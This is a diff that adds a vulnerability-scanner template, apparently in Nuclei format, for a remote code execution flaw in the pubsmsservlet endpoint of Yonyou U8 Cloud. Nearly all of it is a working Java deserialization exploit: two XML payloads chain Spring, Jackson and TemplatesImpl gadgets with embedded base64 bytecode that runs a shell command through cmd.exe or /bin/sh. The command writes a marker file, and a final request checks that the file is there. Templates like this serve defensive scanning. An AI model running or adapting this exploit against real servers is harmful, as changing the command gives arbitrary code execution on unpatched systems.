@@ -1,0 +1,360 @@
+id: u8cloud-pubsmsservlet-rce
+info:
+  name: 用友 U8 Cloud pubsmsservlet 接口 - 远程代码执行漏洞
+  author: Chaitin
+  severity: critical
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: yonyou
+    product: u8cloud
+  tags: rce,vuln,u8cloud,yonyou
+flow: (http(1) && http(3)) || (http(2) && http(3))
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/service/pubsmsservlet'
+    headers:
+      Content-Type: application/xml
+    body: |-
+      <map>
+
+      <entry>
+
+
+      <org.springframework.aop.target.HotSwappableTargetSource>
+
+
+
+      <target class="com.fasterxml.jackson.databind.node.POJONode">
+
+
+
+
+      <__value class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" serialization="custom">
+
+
+
+
+
+      <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
+
+
+
+
+
+
+      <default>
+
+
+
+
+
+
+
+      <__name>a</__name>
+
+
+
+
+
+
+
+      <__bytecodes>
+
+
+
+
+
+
+
+
+      <byte-array>yv66vgAAADIAQAEASW9yZy9hcGFjaGUvc2hpcm8vY295b3RlL25vZGUvQmFzZUpzb25Ob2RlZWU2Njc0NzYxMTFhNGI5NWExZTJkOThhZWRlMDIzMmMHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAEYmFzZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA3NlcAEAA2NtZAEABjxpbml0PgEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HAAsMAAkACgoABAANAQAHb3MubmFtZQgADwEAEGphdmEvbGFuZy9TeXN0ZW0HABEBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DAATABQKABIAFQEAEGphdmEvbGFuZy9TdHJpbmcHABcBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DAAZABoKABgAGwEAA3dpbggAHQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDAAfACAKABgAIQEAB2NtZC5leGUIACMMAAUABgkAAgAlAQACL2MIACcMAAcABgkAAgApAQAHL2Jpbi9zaAgAKwEAAi1jCAAtDAAIAAYJAAIALwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgcAMQEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYMAAkAMwoAMgA0AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsMADYANwoAMgA4AQAIPGNsaW5pdD4BADplY2hvIFRlc3Q2NTk1MTM0MyA+IC5cd2ViYXBwc1x1OGNfd2ViXGEyYjFmMDQ1MmM4N2MxMWUudHh0CAA7CgACAA0BAARDb2RlAQANU3RhY2tNYXBUYWJsZQAhAAIABAAAAAMACQAFAAYAAAAJAAcABgAAAAkACAAGAAAAAgABAAkACgABAD4AAACEAAQAAgAAAFMqtwAOEhC4ABa2ABwSHrYAIpkAEBIkswAmEiizACqnAA0SLLMAJhIuswAqBr0AGFkDsgAmU1kEsgAqU1kFsgAwU0y7ADJZK7cANbYAOVenAARMsQABAAQATgBRAAwAAQA/AAAAFwAE/wAhAAEHAAIAAAllBwAM/AAABwAEAAgAOgAKAAEAPgAAABoAAgAAAAAADhI8swAwuwACWbcAPVexAAAAAAAA</byte-array>
+
+
+
+
+
+
+
+
+      <byte-array>yv66vgAAADQAEwEAAWEHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEABmEuamF2YQEAFGphdmEvaW8vU2VyaWFsaXphYmxlBwAHAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoFceZp7jxtRxgBAA1Db25zdGFudFZhbHVlAQAGPGluaXQ+AQADKClWDAAOAA8KAAQAEAEABENvZGUAIQACAAQAAQAIAAEAGgAJAAoAAQANAAAAAgALAAEAAQAOAA8AAQASAAAAEQABAAEAAAAFKrcAEbEAAAAAAAA=</byte-array>
+
+
+
+
+
+
+
+      </__bytecodes>
+
+
+
+
+
+
+
+      <__transletIndex>0</__transletIndex>
+
+
+
+
+
+
+
+      <__indentNumber>0</__indentNumber>
+
+
+
+
+
+
+      </default>
+
+
+
+
+
+
+      <boolean>false</boolean>
+
+
+
+
+
+      </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
+
+
+
+
+      </__value>
+
+
+
+      </target>
+
+
+      </org.springframework.aop.target.HotSwappableTargetSource>
+
+
+      <org.springframework.aop.target.HotSwappableTargetSource reference="../org.springframework.aop.target.HotSwappableTargetSource"/>
+
+      </entry>
+
+      <entry>
+
+
+      <org.springframework.aop.target.HotSwappableTargetSource>
+
+
+
+      <target class="com.sun.org.apache.xpath.internal.objects.XStringForFSB">
+
+
+
+
+      <m__start>0</m__start>
+
+
+
+
+      <m__length>0</m__length>
+
+
+
+
+      <m__hash>0</m__hash>
+
+
+
+      </target>
+
+
+      </org.springframework.aop.target.HotSwappableTargetSource>
+
+
+      <org.springframework.aop.target.HotSwappableTargetSource reference="../org.springframework.aop.target.HotSwappableTargetSource"/>
+
+      </entry>
+      </map>
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "TranFlag")'
+  - method: POST
+    path:
+      - '{{BaseURL}}/service/pubsmsservlet'
+    headers:
+      Content-Type: application/xml
+    body: |-
+      <map>
+
+      <entry>
+
+
+      <org.springframework.aop.target.HotSwappableTargetSource>
+
+
+
+      <target class="com.fasterxml.jackson.databind.node.POJONode">
+
+
+
+
+      <__value class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" serialization="custom">
+
+
+
+
+
+      <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
+
+
+
+
+
+
+      <default>
+
+
+
+
+
+
+
+      <__name>a</__name>
+
+
+
+
+
+
+
+      <__bytecodes>
+
+
+
+
+
+
+
+
+      <byte-array>yv66vgAAADIAQAEAWG9yZy9hcGFjaGUvY29sbGVjdGlvbnMvY295b3RlL2ludHJvc3BlY3QvQW5ub3RhdGVkTWVtYmVyYjc2NDllOGI2NmNjNDc3MDljOTJkMWE4YTNiYWFiNDQHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAEYmFzZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA3NlcAEAA2NtZAEABjxpbml0PgEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HAAsMAAkACgoABAANAQAHb3MubmFtZQgADwEAEGphdmEvbGFuZy9TeXN0ZW0HABEBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DAATABQKABIAFQEAEGphdmEvbGFuZy9TdHJpbmcHABcBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DAAZABoKABgAGwEAA3dpbggAHQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDAAfACAKABgAIQEAB2NtZC5leGUIACMMAAUABgkAAgAlAQACL2MIACcMAAcABgkAAgApAQAHL2Jpbi9zaAgAKwEAAi1jCAAtDAAIAAYJAAIALwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgcAMQEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYMAAkAMwoAMgA0AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsMADYANwoAMgA4AQAIPGNsaW5pdD4BAD1lY2hvIFRlc3Q2NTk1MTM0MyA+IC4vL3dlYmFwcHMvL3U4Y193ZWIvL2EyYjFmMDQ1MmM4N2MxMWUudHh0CAA7CgACAA0BAARDb2RlAQANU3RhY2tNYXBUYWJsZQAhAAIABAAAAAMACQAFAAYAAAAJAAcABgAAAAkACAAGAAAAAgABAAkACgABAD4AAACEAAQAAgAAAFMqtwAOEhC4ABa2ABwSHrYAIpkAEBIkswAmEiizACqnAA0SLLMAJhIuswAqBr0AGFkDsgAmU1kEsgAqU1kFsgAwU0y7ADJZK7cANbYAOVenAARMsQABAAQATgBRAAwAAQA/AAAAFwAE/wAhAAEHAAIAAAllBwAM/AAABwAEAAgAOgAKAAEAPgAAABoAAgAAAAAADhI8swAwuwACWbcAPVexAAAAAAAA</byte-array>
+
+
+
+
+
+
+
+
+      <byte-array>yv66vgAAADQAEwEAAWEHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEABmEuamF2YQEAFGphdmEvaW8vU2VyaWFsaXphYmxlBwAHAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoFceZp7jxtRxgBAA1Db25zdGFudFZhbHVlAQAGPGluaXQ+AQADKClWDAAOAA8KAAQAEAEABENvZGUAIQACAAQAAQAIAAEAGgAJAAoAAQANAAAAAgALAAEAAQAOAA8AAQASAAAAEQABAAEAAAAFKrcAEbEAAAAAAAA=</byte-array>
+
+
+
+
+
+
+
+      </__bytecodes>
+
+
+
+
+
+
+
+      <__transletIndex>0</__transletIndex>
+
+
+
+
+
+
+
+      <__indentNumber>0</__indentNumber>
+
+
+
+
+
+
+      </default>
+
+
+
+
+
+
+      <boolean>false</boolean>
+
+
+
+
+
+      </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
+
+
+
+
+      </__value>
+
+
+
+      </target>
+
+
+      </org.springframework.aop.target.HotSwappableTargetSource>
+
+
+      <org.springframework.aop.target.HotSwappableTargetSource reference="../org.springframework.aop.target.HotSwappableTargetSource"/>
+
+      </entry>
+
+      <entry>
+
+
+      <org.springframework.aop.target.HotSwappableTargetSource>
+
+
+
+      <target class="com.sun.org.apache.xpath.internal.objects.XStringForFSB">
+
+
+
+
+      <m__start>0</m__start>
+
+
+
+
+      <m__length>0</m__length>
+
+
+
+
+      <m__hash>0</m__hash>
+
+
+
+      </target>
+
+
+      </org.springframework.aop.target.HotSwappableTargetSource>
+
+
+      <org.springframework.aop.target.HotSwappableTargetSource reference="../org.springframework.aop.target.HotSwappableTargetSource"/>
+
+      </entry>
+      </map>
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "TranFlag")'
+  - method: GET
+    path:
+      - '{{BaseURL}}/a2b1f0452c87c11e.txt'
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "Test65951343")'
